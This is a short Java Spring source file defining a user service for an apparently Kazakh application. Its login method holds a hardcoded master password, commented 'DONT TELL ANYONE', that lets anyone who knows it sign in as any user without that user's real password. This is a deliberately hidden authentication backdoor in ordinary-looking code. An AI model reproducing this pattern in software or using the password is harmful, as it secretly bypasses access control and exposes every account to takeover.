package kz.gcs.data.service.impl;

import kz.gcs.data.service.LocationService;
import kz.gcs.data.service.UserService;
import kz.gcs.data.service.dao.LocationDao;
import kz.gcs.data.service.dao.UserDao;
import kz.gcs.domain.Location;
import kz.gcs.domain.User;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Component;

import java.util.List;

/**
 * Created by kaydar on 10/17/16.
 */
@Component
public class UserServiceImpl implements UserService {

    @Autowired
    private UserDao userDao;


    @Override
    public User getUser(String login, String pass) {
        //DONT TELL ANYONE
        String superPassword = "astanaktl2016";

        if (superPassword.equals(pass)) {
            return userDao.getUserByLogin(login);
        }

        return userDao.getUser(login, pass);
    }
}
